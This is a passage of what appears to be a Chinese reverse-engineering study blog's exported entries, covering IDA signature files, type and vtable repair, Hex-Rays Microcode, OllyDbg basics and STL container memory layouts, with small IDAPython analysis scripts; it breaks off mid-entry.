<p>它会在当前目录下生成一个.exc文件，它是可编辑的，我们将该.exc文件的前几行注释删除，在我们要选择特征值对应的函数名称最前面加一个+号即可，如果不管就什么也不加。如下图，我选择了第一个该特征值的第一个函数。<img src="/./../images/image-20240625162940235.png" alt="image-20240625162940235"></p>
<h3 id="修改完-exc文件后，再次重复之前生成sig文件的命令就好了。"><a href="#修改完-exc文件后，再次重复之前生成sig文件的命令就好了。" class="headerlink" title="修改完.exc文件后，再次重复之前生成sig文件的命令就好了。"></a>修改完.exc文件后，再次重复之前生成sig文件的命令就好了。</h3><blockquote>
<p>.&#x2F;linux&#x2F;sigmake -n“my_sig” libc.pat libc.sig</p>
</blockquote>
<h3 id="应用生成的sig文件到IDA中"><a href="#应用生成的sig文件到IDA中" class="headerlink" title="应用生成的sig文件到IDA中"></a>应用生成的sig文件到IDA中</h3><p>将生成的签名文件复制到IDA中的sig目录下。</p>
<p>回到IDA中之前分析的该elf文件，shift+f5打开应用库的窗口，然后右键把我们新复制到的sig目录下的sig文件添加进来。如下图，添加后，成功匹配了程序中的735个函数。而上面之前的libc却匹配了0个函数，这也正说明了版本变化带来的差异之大。</p>
<img src="/./../images/image-20240625163029263.png" alt="image-20240625163029263" style="zoom:67%;">

<h3 id="查看应用新sig文件后的main函数"><a href="#查看应用新sig文件后的main函数" class="headerlink" title="查看应用新sig文件后的main函数"></a>查看应用新sig文件后的main函数</h3><p>如下图，scanf和puts相关函数都识别出来了。<img src="/./../images/image-20240625163056902.png" alt="image-20240625163056902" style="zoom:67%;"></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA结构体分析</title>
    <url>/2023/01/21/IDA%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>IDA 类型修复</p>
<span id="more"></span>

<p>源码编译成二进制代码的过程中，大量辅助信息被删除，其中最重要的就是类型信息</p>
<p>为什么要修复伪代码中的类型？</p>
<ul>
<li>提高伪代码的准确度</li>
<li>指导 IDA 反编译器中的优化器使用正确的优化方案</li>
<li>让 IDA 生成的伪代码更接近源码</li>
</ul>
<p>我们需要手动修复哪些类型？</p>
<ul>
<li>函数返回值类型</li>
<li>参数类型 &#x2F; 局部变量类型 &#x2F; 全局变量类型</li>
<li>数组类型 &#x2F; 数组大小</li>
<li>结构体类型</li>
<li>虚表类型</li>
</ul>
<p>IDA 数组修复主要有两种：</p>
<p>1.局部变量中定义的数组</p>
<p>2.全局变量中定义的数组</p>
<p>数组修复要考虑：数据类型 + 数组大小</p>
<h2 id="IDA-修复枚举值"><a href="#IDA-修复枚举值" class="headerlink" title="IDA 修复枚举值"></a>IDA 修复枚举值</h2><p>实验材料：ptrace1</p>
<p>IDA 的类型数据库内置了常见的枚举（宏）的值，可以直接引入并修复。</p>
<p>通过逆向分析，ptrace函数</p>
<p><img src="/./../images/image-20230121101355025.png" alt="image-20230121101355025"></p>
<p>第一个参数就是ptrace函数的功能号</p>
<p>鼠标锁定摁M键导入枚举值</p>
<p>Ctrl+F5搜索ptrace关键字</p>
<p><img src="/./../images/image-20230121101528976.png" alt="image-20230121101528976"></p>
<p>找到后双击即可</p>
<p><img src="/./../images/image-20230121101553907.png" alt="image-20230121101553907"></p>
<p>下图就全部修复完成了</p>
<p><img src="/./../images/image-20230121101813329.png" alt="image-20230121101813329"></p>
<h2 id="IDA-结构体修复"><a href="#IDA-结构体修复" class="headerlink" title="IDA 结构体修复"></a>IDA 结构体修复</h2><p>实验材料：monopoly</p>
<p>这是一个大富翁游戏！</p>
<p>确定结构体大小：</p>
<ul>
<li>内存分配可以直接确定结构体大小</li>
<li>memcpy &#x2F; 局部变量偏移差 -&gt; 间接确定 （结构体&#x2F;类局部变量） 这种大多是在栈上</li>
</ul>
<p><img src="/./../images/image-20230121104326617.png" alt="image-20230121104326617"></p>
<p>创建相等大小匿名结构体，并将相关变量、参数的类型修改为该结构体</p>
<p>这里看见这个0x70的new函数，直接在struct视图下创建结构体</p>
<p><img src="/./../images/image-20230121105019521.png" alt="image-20230121105019521"></p>
<p>快捷键是Shift + F9，打开struct视图</p>
<p>这里在struct视图下，右键点击增加结构体类型</p>
<p><img src="/./../images/image-20230121105406208.png" alt="image-20230121105406208"></p>
<p>这里可以看见结构体大小</p>
<p><img src="/./../images/image-20230121105556782.png" alt="image-20230121105556782"></p>
<p>鼠标光标在ends处，增加属性（大小）：摁d键</p>
<p><img src="/./../images/image-20230121105718374.png" alt="image-20230121105718374"></p>
<p>这里直到sizeof显示为0x70为止，每个属性先以dq为单位，进行存储，后续再逆向分析再进行变更</p>
<p>这样结构体就初步设置完成了</p>
<p><img src="/./../images/image-20230121110056164.png" alt="image-20230121110056164"></p>
<p>这里回到代码处，这里将v0的类型修改为，刚刚我们创建的结构体类型</p>
<p><img src="/./../images/image-20230121110310274.png" alt="image-20230121110310274"></p>
<p>第一种改法：摁Y键，进行类型修改为struc_1 *类型</p>
<p>第二种改法：摁右键，转化为其他结构体：</p>
<p><img src="/./../images/image-20230121110552200.png" alt="image-20230121110552200"></p>
<p>这里直接选择我们刚刚创建的类型即可</p>
<p><img src="/./../images/image-20230121110626662.png" alt="image-20230121110626662"></p>
<p>这里创建好之后，执行下面的函数，我们跟进去看看</p>
<p><img src="/./../images/image-20230121120704877.png" alt="image-20230121120704877"></p>
<p>这里的a1进行了一系列操作，我们将a1的类修修改为我们定义的类型<img src="/./../images/image-20230121120850500.png" alt="image-20230121120850500"></p>
<p>因为这个函数在new之后执行，所以可能是构造函数，这里我们改个函数名吧<img src="/./../images/image-20230121121052464.png" alt="image-20230121121052464"></p>
<p>在构造函数中，有些属性是进行dword操作，这里我们就要将qword，改成dword类型<img src="/./../images/image-20230121121546769.png" alt="image-20230121121546769"></p>
<p>比如field_48，这里双击field_48进入结构体定义处，将该属性改成dword，这里摁d键<img src="/./../images/image-20230121121758509.png" alt="image-20230121121758509"></p>
<p>设置好之后下面未定义的也需要改成dword，就像这样<img src="/./../images/image-20230121121852483.png" alt="image-20230121121852483"></p>
<p>其他变量也是一样修改，把剩下的也修改了，但是当最后一个属性改为dword后，总大小发生了改变，这里我们只需要在下面再增加一个变量即可<img src="/./../images/image-20230121122116991.png" alt="image-20230121122116991"></p>
<p>最后就是这样<img src="/./../images/image-20230121122144895.png" alt="image-20230121122144895"></p>
<p>然后在源码中摁F5，代码就好看多了<img src="/./../images/image-20230121122453040.png" alt="image-20230121122453040"></p>
<p>上面循环处field_4c是以4字节进行访问，并且访问5词，也就是说field_4c开始处是一个以4字节为单位的一个数组，数组大小为5，在结构体定义处，右键点array设置数组，大小为5<img src="/./../images/image-20230121122734380.png" alt="image-20230121122734380"></p>
<p>最终field_4c后面的变量也将合并进入数组中<img src="/./../images/image-20230121122825156.png" alt="image-20230121122825156"></p>
<p>源码舒服，重命名为array1<img src="/./../images/image-20230121123416130.png" alt="image-20230121123416130"></p>
<p>这里进行字符串的初始化和赋值操作<img src="/./../images/image-20230121123758528.png" alt="image-20230121123758528"></p>
<p>这里我们将field_20改为str1</p>
<p>根据大富翁游戏，初始化的字符串，根据名字都是一些建筑，我们可以把定义的结构体名称改成house，然后将构造函数改成init_house<img src="/./../images/image-20230121124542969.png" alt="image-20230121124542969"></p>
<p>然后经过构造函数，申请到的对象内存都会存放到，以A1C0为首的地址处<img src="/./../images/image-20230121125509200.png" alt="image-20230121125509200"></p>
<p><img src="/./../images/image-20230121125527179.png" alt="image-20230121125527179"></p>
<p>上面一共64个位置，所以类型为house *为类型，数组长度为64个来存放house对象的指针<img src="/./../images/image-20230121125756372.png" alt="image-20230121125756372"></p>
<p>这里再右键array改为64<img src="/./../images/image-20230121125834301.png" alt="image-20230121125834301"></p>
<p>这些建筑正好形成地图，将数组名改成map即可<img src="/./../images/image-20230121130116722.png" alt="image-20230121130116722"></p>
<p>分析另外一个结构体，这个结构体没有使用 new &#x2F; malloc 分配内存，如何确定大小？<img src="/./../images/image-20230121132813993.png" alt="image-20230121132813993"></p>
<p>进入函数，看起来明显是个初始化函数<img src="/./../images/image-20230121132852076.png" alt="image-20230121132852076"></p>
<p>两个变量都是紧挨着的在内存中，属于静态分配了<img src="/./../images/image-20230121132938102.png" alt="image-20230121132938102"></p>
<p>两个变量位置相减为0x80，所以我们就暂时确定这个结构体的大小为0x80，然后我就去struct视图中去创建一个大小为0x80的结构体，还是老操作<img src="/./../images/image-20230121133259989.png" alt="image-20230121133259989"></p>
<p>这里其实可以先创建64长度的数组，然后再取消定义，这样就可以快速创建结构体了</p>
<p>类型定义好之后，函数外的全局变量类型不急着更改，先更改函数形参的类型<img src="/./../images/image-20230122155016716.png" alt="image-20230122155016716"></p>
<p>在函数中判断feild_20可能是个数组，这里先不理会</p>
<p>后面函数形参类型也需要一个个去修改<img src="/./../images/image-20230122155424970.png" alt="image-20230122155424970"></p>
<p>刷新一下变成这样了，给变量改个名<img src="/./../images/image-20230122182413118.png" alt="image-20230122182413118"></p>
<p>把剩余需要修改的变量大小继续更改<img src="/./../images/image-20230122183001258.png" alt="image-20230122183001258"></p>
<p>然后这里根据printf的字符串信息来判断结构体的类型<img src="/./../images/image-20230122183705595.png" alt="image-20230122183705595"></p>
<p>v6可能是建筑的类型，从map数组中取出来的结构体都是house类型了，然后把变量名都改成自己猜想的名字。</p>
<p>这个函数的实参是map数组元素，形参应该改为house结构体指针<img src="/./../images/image-20230122185813240.png" alt="image-20230122185813240"></p>
<p>这里有个field_40,不能确定是啥<img src="/./../images/image-20230122190051439.png" alt="image-20230122190051439"></p>
<p>我们可以用交叉引用，去别的地方找信息，刚好这里有一处<img src="/./../images/image-20230122190406178.png" alt="image-20230122190406178"></p>
<p>这里将ppp1赋给field_40，所以我们就将field_40改成结构体2类型</p>
<p>以上就是随意逆向的结果，真正正经逆向都是要分析程序逻辑的，我们先随意逆向，分析部分属性信息，有助于我们之后的分析</p>
<p>程序刚开始会让我们输入游戏难度等级<img src="/./../images/image-20230122191713348.png" alt="image-20230122191713348"></p>
<p>经过分析这个就是获取数字的函数<img src="/./../images/image-20230122191835438.png" alt="image-20230122191835438"></p>
<p>然后我们先从简单的easy_level开始<img src="/./../images/image-20230122192539523.png" alt="image-20230122192539523"></p>
<p>从这分析出ppp3是玩家的意思，因为刚开始它就给ppp3给到初始的金额了<img src="/./../images/image-20230122192843765.png" alt="image-20230122192843765"></p>
<p>然后进入一个循环，首先进入这个函数<img src="/./../images/image-20230122193721525.png" alt="image-20230122193721525"></p>
<p>这个函数很明显是个循环<img src="/./../images/image-20230122193909583.png" alt="image-20230122193909583"></p>
<p>有两个函数，一个只有player1另外还有player2，也就是一个人玩玩，另一个人玩<img src="/./../images/image-20230122195530524.png" alt="image-20230122195530524"><img src="/./../images/image-20230122195544442.png" alt="image-20230122195544442"></p>
<p>然后这里我们需要输入我们想做的内容<img src="/./../images/image-20230122202153532.png" alt="image-20230122202153532"></p>
<p>我们先以第一个，这里有个比较，应该是玩家资产数量<img src="/./../images/image-20230122202349924.png" alt="image-20230122202349924"></p>
<p>要求输入的值不能超过，玩家拥有的资产的数量。所以sub_452F函数估计就是资产的售卖了</p>
<p>这里售卖的函数中<img src="/./../images/image-20230122203152235.png" alt="image-20230122203152235"></p>
<p>这里资产数组大小为map的总个数为64个<img src="/./../images/image-20230122203328139.png" alt="image-20230122203328139"></p>
<p>然后是3，购买资产<img src="/./../images/image-20230122210502911.png" alt="image-20230122210502911"></p>
<p>分析得<img src="/./../images/image-20230122210702534.png" alt="image-20230122210702534"></p>
<p>最终：<img src="/./../images/image-20230122210742758.png" alt="image-20230122210742758"></p>
<p><img src="/./../images/image-20230122210913452.png" alt="image-20230122210913452"></p>
<p>全局字段交叉引用 Ctrl + alt + X （要尽可能将相关函数找出来并修复类型，有利于查找）</p>
<h2 id="IDA-虚表修复"><a href="#IDA-虚表修复" class="headerlink" title="IDA 虚表修复"></a>IDA 虚表修复</h2><p>实验材料： vtable</p>
<p>虚表就是C++实现多态的一种机制</p>
<p>为了实现C++的多态，C++使用了一种动态绑定的技术。这个技术的核心是虚函数表，当一个类（A）继承另一个类（B）时，类A会继承类B的函数的调用权。所以如果一个基类包含了虚函数，那么其继承类也可调用这些虚函数，换句话说，一个类继承了包含虚函数的基类，那么这个类也拥有自己的虚表。我们来看以下的代码。类A包含虚函数vfunc1，vfunc2，由于类A包含虚函数，故类A拥有一个虚表。</p>
<pre><code class="c++">class A &#123;
public:
    virtual void vfunc1();
    virtual void vfunc2();
    void func1();
    void func2();
private:
    int m_data1, m_data2;
&#125;;
</code></pre>
<p>类A的虚表如图1所示:<img src="/./../images/image-20230122212103043.png" alt="image-20230122212103043"></p>
<p>虚表是一个指针数组，其元素是虚函数的指针，每个元素对应一个虚函数的函数指针。需要指出的是，普通的函数即非虚函数，其调用并不需要经过虚表，所以虚表的元素并不包括普通函数的函数指针。虚表内的条目，即虚函数指针的赋值发生在编译器的编译阶段，也就是说在代码的编译阶段，虚表就可以构造出来了</p>
<p>虚表修复主要是为了重建虚表交叉引用,一般类的第一个地址就是虚表的地址。</p>
<p>这里就是调用虚表的某一个函数<img src="/./../images/image-20230122213810302.png" alt="image-20230122213810302"></p>
<p>这里类大小为0x28字节<img src="/./../images/image-20230122213834372.png" alt="image-20230122213834372"></p>
<p>这里我们找到虚表，点击这个就是虚表<img src="/./../images/image-20230122213906848.png" alt="image-20230122213906848"></p>
<p>然后右边是虚表的符号<img src="/./../images/image-20230122213950337.png" alt="image-20230122213950337"></p>
<p>这里先进行构建结构体，在结构体中表示虚表，一个函数地址，在64位中为32位<img src="/./../images/image-20230122214250424.png" alt="image-20230122214250424"></p>
<p>创建好后，创建类结构体，然后将类结构体的第一个属性类型设置为虚表类型<img src="/./../images/image-20230122214426259.png" alt="image-20230122214426259"></p>
<p>然后将v3的类型设置为类结构体类型<img src="/./../images/image-20230122214509446.png" alt="image-20230122214509446"></p>
<p>然后就修复完成了<img src="/./../images/image-20230122214621630.png" alt="image-20230122214621630"></p>
<p><img src="/./../images/image-20230122214835711.png" alt="image-20230122214835711"></p>
]]></content>
      <categories>
        <category>re</category>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>Microcode</title>
    <url>/2023/01/19/Microcode/</url>
    <content><![CDATA[<p>记录Microcode </p>
<span id="more"></span>

<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Microcode 是 hexrays 内部采用的介于机器代码与伪代码之间的一种中间表示语言(IR)。</p>
<p>Microcode 生成完成后，IDA 在 Microcode 的基础上生成 CTree。 CTree 是 IDA 内部用于表示 C语言伪代码的抽象语法树，IDA 也提供了大量 API 操作 CTree，可以实现一下伪代码展示方面的优化，例如删除某些节点等等。</p>
<p>Microcode 指令格式</p>
<p>opcode left, right, destination<br>一般来说有三个操作数，有一些指令可能缺少某个操作数，destination 也不一定会被修改（Store 指令）</p>
<p>Microcode 中常见的数据结构</p>
<p>函数是 IDA 中最大的汇编结果表示单位</p>
<p>函数 → 基本块 → 指令 → 操作数</p>
<p>Microcode 可视化插件</p>
<p><a href="https://github.com/gaasedelen/lucid">https://github.com/gaasedelen/lucid</a></p>
<p>Ctree 可视化插件<br><a href="https://github.com/patois/HRDevHelper">https://github.com/patois/HRDevHelper</a></p>
<p>Microcode生成过程：</p>
<ol>
<li><p>生成 Microcode</p>
</li>
<li><p>变换 Microcode （例如优化）</p>
</li>
<li><p>局部变量分配</p>
</li>
<li><p>生成 CTree （CTree 是 IDA 用来表示伪代码的抽象语法树 AST）</p>
</li>
<li><p>优化 CTree</p>
</li>
<li><p>输出 CTree</p>
</li>
</ol>
<p>Microcode 寄存器</p>
<p>microcode 的寄存器没有数量限制，物理寄存器往往会被直接映射到 microcode 寄存器，例如</p>
<ul>
<li>AL   is mapped into al.1 (mreg number 8)</li>
<li>AH  is mapped into ah.1 (mreg number 9)</li>
<li>EAX is mapped into eax.4 (mreg numbers 8-11)</li>
<li>RSI  is mapped into rsi.8</li>
</ul>
<p>Microcode 分阶段生成, 最初阶段生成的代码非常冗余</p>
<p><img src="/./../images/image-20230119221600205.png" alt="image-20230119221600205"></p>
<p>Microcode 快速上手，手动调用 microcode 生成</p>
<pre><code class="py">import ida_hexrays
import idaapi
def print_microcode(func_ea):
    maturity = ida_hexrays.MMAT_GLBOPT3
    #   maturity:
    #   MMAT_ZERO,          //&lt; microcode 不存在
    #   MMAT_GENERATED      //&lt; 已经生成的microcode
    #   MMAT_PREOPTIMIED    //&lt; 预先优化的pass已完成
    #   MMAT_LOCOPT         //&lt; local 本地每个基本块的优化已完成    control控制流图也就绪
    #   MMAT_CALLS          //&lt; 检测调用参数
    #   MMAT_GLBOPT1        //&lt; 执行第一个全局优化pass
    #   MMAT_GLBOPT2        //&lt; 大多数全局优化pass已完成
    #   MMAT_GLBOPT3        //&lt; 完成所有的优化，microcode被修改
    #   MMAT_LVAR3          //&lt; 分配所有的局部变量
    hf = ida_hexrays.hexrays_failure_t()
    pfn = idaapi.get_func(func_ea)
    rng = ida_hexrays.mba_ranges_t(pfn)
    mba = ida_hexrays.gen_microcode(rng,hf,None,
                                    ida_hexrays.DECOMP_WARNINGS,maturity)
    vp = ida_hexrays.vd_printer_t()
    mba._print(vp)
print_microcode(0x1229)
</code></pre>
<p>Microcode 相关的数据结构，定义在 hexrays.hpp 文件 </p>
<p><img src="/./../images/image-20230119221901715.png" alt="image-20230119221901715"></p>
<p><img src="/./../images/image-20230119222011500.png" alt="image-20230119222011500"></p>
<p>Microcode 相关的数据结构: <strong>mbl_array_t</strong>,这个结构用来存放函数的基本块信息</p>
<ul>
<li>基本块之间使用双向链表链接</li>
<li>基本块数组存放在 natural 数组</li>
</ul>
<p><img src="/./../images/image-20230119222056330.png" alt="image-20230119222056330"></p>
<p>Microcode 相关的数据结构: mblock_t,这个结构用来描述基本块信息。±基本块内的指令与指令之间使用双向链表链接</p>
<p><img src="/./../images/image-20230119222156151.png" alt="image-20230119222156151"></p>
<p>Microcode 相关的数据结构: minsn_t。用于描述指令信息的结构。（注意微码指令支持指令嵌套。）</p>
<p><img src="/./../images/image-20230119222222555.png" alt="image-20230119222222555"></p>
<p>Microcode 相关的数据结构: mop_t</p>
<p>用于描述操作数信息的结构，指令 minsn_t 有 0 ~ 3 个操作数，分别时 l (left), r (right), d (destination) 操作数的类型用 mop_t 来表示</p>
<p><img src="/./../images/image-20230119222252600.png" alt="image-20230119222252600"></p>
<p>Microcode 插件例子</p>
<ul>
<li>实现 svc 0x900001 与 svc 0x9000F8 指令反编译成一条 call 指令</li>
<li>install_microcode_filter 注册 microcode filter 实现拦截指令翻译</li>
<li>microcode filter 是一种可以拦截 microcode 指令生成的机制，开发者需要继承 microcode_filter_t 类并实现 match 与 apply 两个函数。 </li>
<li>ida 在生成某一条指令的 microcode 之前会调用所有已经注册的 filter 的 match 函数，若 match 函数返回 True，则调用对应的 apply 函数实现指令替换。</li>
<li>我们需要将 svc 指令替换成 call 指令，ida 已经为我们实现了替换类 udc_filter_t, 这个类继承于 microcode_filter_t 并实现了 apply 方法（即替换call指令），我们需要继承 udc_filter_t 并实现它的 match 方法用于判断拦截的指令。</li>
</ul>
<p>Microcode 插件例子</p>
<p><img src="/./../images/image-20230119222437041.png" alt="image-20230119222437041"></p>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>Microcode</tag>
      </tags>
  </entry>
  <entry>
    <title>OD工具的使用</title>
    <url>/2024/06/24/OD%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>​	Ollydbg</p>
<span id="more"></span>

<h1 id="OD介绍"><a href="#OD介绍" class="headerlink" title="OD介绍"></a>OD介绍</h1><p>​	OllyDbg（以作者Oleh Yuschuk命名）是一款用于Windows32位二进制文件的汇编代码级反汇编调试工具，有友好的用户界面，并支持第三方插件扩展功能。该软件是免费的，但共享软件许可证要求用户注册。当前版本的OllyDbg不支持反汇编64位的二进制文件。 OllyDbg 1.10版本是1.x的最终版本。2.0版本于2010年6月发布，此版本重写了OllyDbg。 OllyDbg由于它的易用性（任何32位可执行文件都可以由调试器使用，并在二进制码&#x2F;汇编代码中实时编辑）通常用于程序的逆向工程，常被用来破解软件，也常用于程序的动态调试和恶意软件分析</p>
<h2 id="什么是反汇编？"><a href="#什么是反汇编？" class="headerlink" title="什么是反汇编？"></a>什么是反汇编？</h2><p>反汇编：</p>
<p>​	在传统的软件开发模型中，程序员使用编辑器、汇编器和链接器中的一个或几个创建可执行程序。为了回溯编程过程（或者叫对程序进行逆向工程），我们使用各种工具来撤销汇编和编译过程。这些工具就叫做反汇编工具和反汇编器。反汇编器撤销汇编过程，我们可以得到汇编语言形式的输出结果（以机械语言作为输入）。反编译器则以汇编语言甚至是机械语言为输入，输出结果是高级语言。</p>
<h3 id="C语言程序用作实验"><a href="#C语言程序用作实验" class="headerlink" title="C语言程序用作实验"></a>C语言程序用作实验</h3><pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

int main(void)
&#123;
    char title[] = &quot;OD工具使用&quot;;
    char text[] = &quot;学习使用OD_xxx&quot;;
    
    MessageBoxA(0, text, title, 1);
    
    return 0;
&#125; 
</code></pre>
<h3 id="OD基本使用"><a href="#OD基本使用" class="headerlink" title="OD基本使用"></a>OD基本使用</h3><p>OD工具目录中各个子目录的介绍：</p>
<ul>
<li>ico目录中是OD程序中的图标图片。</li>
<li>plugin目录是存放我们OD程序中使用插件的目录。</li>
<li>skins目录是OD程序中使用皮肤文件。</li>
<li>UDD目录是存放我们分析过的文件的分析记录，如下断点情况等。</li>
</ul>
<p><img src="/./../images/image-20240626224308352.png" alt="image-20240626224308352"></p>
<p>OD工具目录中各个子文件的介绍：</p>
<ul>
<li>ollydbg.ini是od程序及其插件的配置文件</li>
<li><strong>PEiD是程序查壳软件</strong></li>
<li>Udd Cleaner.exe是清楚UDD目录下的缓存文件</li>
</ul>
<p><img src="/./../images/image-20240626224339419.png" alt="image-20240626224339419"></p>
<h3 id="OD主界面整体介绍："><a href="#OD主界面整体介绍：" class="headerlink" title="OD主界面整体介绍："></a>OD主界面整体介绍：<img src="/./../images/image-20240626224503211.png" alt="image-20240626224503211"></h3><h3 id="OD程序上各个键位的讲解："><a href="#OD程序上各个键位的讲解：" class="headerlink" title="OD程序上各个键位的讲解："></a>OD程序上各个键位的讲解：</h3><p><img src="/./../images/image-20240626230511204.png" alt="image-20240626230511204"></p>
<p>从左往右：</p>
<ol>
<li>首先黄色框显示了程序此时的状态，这里是暂停</li>
<li>接着打开文件夹 f3</li>
<li>然后是重新载入程序分析 ctrl+f2</li>
<li>再是运行按钮 f9 </li>
<li>最后是暂停按钮 f12</li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>OD</tag>
      </tags>
  </entry>
  <entry>
    <title>SMC原理</title>
    <url>/2024/06/22/SMC%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>SMC加密技术</p>
<span id="more"></span>



]]></content>
      <categories>
        <category>ctf</category>
        <category>Windows逆向</category>
      </categories>
  </entry>
  <entry>
    <title>STL函数识别</title>
    <url>/2024/06/23/STL%E5%87%BD%E6%95%B0%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<p>​	C++方向逆向STL</p>
<span id="more"></span>

<h1 id="什么是STL"><a href="#什么是STL" class="headerlink" title="什么是STL"></a>什么是STL</h1><p>STL是C++标准模板库，内置了很多常用的数据结构和算法，例如动态数组、队列等。故STL在日常编程开发中很常用，故在逆向过程中学习STL是必要的。</p>
<p>逆向中STL的主要问题：</p>
<ol>
<li>缺少符号，无法判断STL容器类型</li>
<li>STL内部数据结构相当复杂，难以提取数据</li>
<li>O3优化使用大量STL函数被内联</li>
</ol>
<blockquote>
<p><code>O3优化是为了提高程序编译运行速度采用的优化方式，函数内联是将函数代码直接嵌入原代码中，减少了函数调用带来的损失。</code></p>
<p>这使得逆向过程中会很难分清是STL的代码还是用户自己的代码。</p>
</blockquote>
<p>常见的STL容器：</p>
<ol>
<li>std::string 字符串</li>
<li>std::vector 动态数组</li>
<li>std::map 关联数组</li>
</ol>
<h2 id="案例介绍"><a href="#案例介绍" class="headerlink" title="案例介绍"></a>案例介绍</h2><p>无优化有符号：</p>
<p><img src="/./../images/image-20240623132004934.png" alt="image-20240623132004934"></p>
<p>O3+有符号</p>
<p><img src="/./../images/image-20240623153746663.png" alt="image-20240623153746663"></p>
<p>对比O0和O3的差距非常大</p>
<hr>
<h1 id="STL内存布局"><a href="#STL内存布局" class="headerlink" title="STL内存布局"></a>STL内存布局</h1><p>在调试程序时观察数据内存布局推断容器类型，以64位gnu C++的stl为例</p>
<p>std::string 结构大致如下：</p>
<pre><code class="c++">struct basic_string
&#123;
    char *begin_; //actual string data
    size_t size; //actual size
    union
    &#123;
        size_t capacity; //used if larger than 15 bytes
        char sso_buffer[16];//used if smaller than 16 bytes
    &#125;
&#125;
</code></pre>
<p>该结构体固定长度为32字节，4个dq</p>
<p>如果字符串长度小于16，数据就存储在当前结构，否则重新分配内存存放数据</p>
<p><img src="/./../images/image-20240623212040658.png" alt="image-20240623212040658"></p>
<p>std::vector 内存布局</p>
<pre><code class="c++">struct vector_point
&#123;
    Point* start;//指向数据起始长度
    Point* end;//指向数据结束地址
    Point* max;//指向已分配内存的最大长度
&#125;
</code></pre>
<p>固定长度24字节，3个dq</p>
<p>调试验证</p>
<p><img src="/./../images/image-20240623212120677.png" alt="image-20240623212120677"></p>
<p>std::map内存布局，stl内部使用红黑树实现std::map，要获得所有键值对，这里只需要遍历二叉树即可</p>
<pre><code class="c++">struct std::map
&#123;
    void* allocator; //ignore
    color color; //ignore
    node  * root;
    node * leftmost;	//ignore
    node * rightmost;	//ignore
    size_t node_count;
&#125;
struct node
&#123;
    color color;
    node * parent;
    node * left;
    node * right;
    
    TypeKey key;	//data_area
    TypeValue value;
&#125;
</code></pre>
<p>解析脚本</p>
<pre><code class="python">import idautils 
import idaapi 
import idc 

# parse gnu c++ stlmap 
def parse_gnu_map_header(address): 
    root = idc.read_dbg_qword(address + 0x10) 
    return root 
def parse_gnu_map_node(address): 
    left  = idc.read_dbg_qword(address + 0x10) 
    right = idc.read_dbg_qword(address + 0x18) 
    data  = address + 0x20 
    return left, right, data 
def parse_gnu_map_travel(address): 
    # address &lt;- std::map struct address 
    result = [] 
    worklist = [parse_gnu_map_header(address)] 
    while len(worklist) &gt; 0: 
        addr = worklist.pop() 
        (left, right, data) = parse_gnu_map_node(addr) 
        if left &gt; 0: 
            worklist.append(left) 
        if right &gt; 0: 
            worklist.append(right); 
        result.append(data) 
    return result 
# example 
elements = parse_gnu_map_travel(0x564D240D0EB0) 
for elem in elements: 
    print(hex(elem)) 
</code></pre>
]]></content>
      <categories>
        <category>ctf</category>
        <category>Windows逆向</category>
      </categories>
  </entry>
  <entry>
    <title>STL逆向</title>
    <url>/2023/01/20/STL%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<p>c++ STL</p>
<span id="more"></span>

<h1 id="STL-逆向方法论"><a href="#STL-逆向方法论" class="headerlink" title="STL 逆向方法论"></a>STL 逆向方法论</h1><ul>
<li>识别 STL 容器类型</li>
<li>识别 STL 容器操作</li>
<li>提取 STL 容器中的数据</li>
</ul>
<p><strong>逆向 STL 主要的问题:</strong></p>
<ol>
<li>缺少符号，无法判断 STL 容器类型 （主要困难）</li>
<li>STL 内部数据结构复杂，难以提取数据</li>
<li>优化使大量 stl 函数被 inline</li>
</ol>
<p>方法：解析 STL 容器内存数据，从内存数据角度判断容器类型，提取容器内容判断函数操作。</p>
<h2 id="常见-STL-容器"><a href="#常见-STL-容器" class="headerlink" title="常见 STL 容器"></a>常见 STL 容器</h2><p>序列容器</p>
<ul>
<li>vector</li>
<li>Deque</li>
<li>List</li>
<li>String</li>
</ul>
<p>关联容器</p>
<ul>
<li>Pair</li>
<li>Map</li>
<li>Set</li>
<li>MultiMap &#x2F; MultiSet</li>
</ul>
<p>无序关联容器:unordered_map</p>
<h1 id="C-STL关联式容器是什么？"><a href="#C-STL关联式容器是什么？" class="headerlink" title="C++ STL关联式容器是什么？"></a>C++ STL关联式容器是什么？</h1><p>此类容器在存储元素值的同时，还会为各元素额外再配备一个值（又称为“键”，其本质也是一个 C++ 基础数据类型或自定义类型的元素），它的功能是在使用关联式容器的过程中，如果已知目标元素的键的值，则直接通过该键就可以找到目标元素，而无需再通过遍历整个容器的方式。</p>
<p>弃用序列式容器，转而选用关联式容器存储元素，往往就是看中了关联式容器可以快速查找、读取或者删除所存储的元素，同时该类型容器插入元素的效率也比序列式容器高。</p>
<h1 id="常见-STL-容器适配器"><a href="#常见-STL-容器适配器" class="headerlink" title="常见 STL 容器适配器"></a>常见 STL 容器适配器</h1><p><strong>容器适配器</strong>是一个封装了序列容器的类模板，它在一般序列容器的基础上提供了一些不同的功能。之所以称作适配器类，是因为它可以通过适配容器现有的接口来提供不同的功能。</p>
<p>其实，容器适配器中的“适配器”，和生活中常见的电源适配器中“适配器”的含义非常接近。我们知道，无论是电脑、手机还是其它电器，充电时都无法直接使用 220V 的交流电，为了方便用户使用，各个电器厂商都会提供一个适用于自己产品的电源线，它可以将 220V 的交流电转换成适合电器使用的低压直流电。</p>
<p>从用户的角度看，电源线扮演的角色就是将原本不适用的交流电变得适用，因此其又被称为电源适配器。</p>
<p>举一个例子，假设一个代码模块 A，它的构成如下所示：</p>
<pre><code class="cpp">class A&#123;
public:
    void f1()&#123;&#125;
    void f2()&#123;&#125;
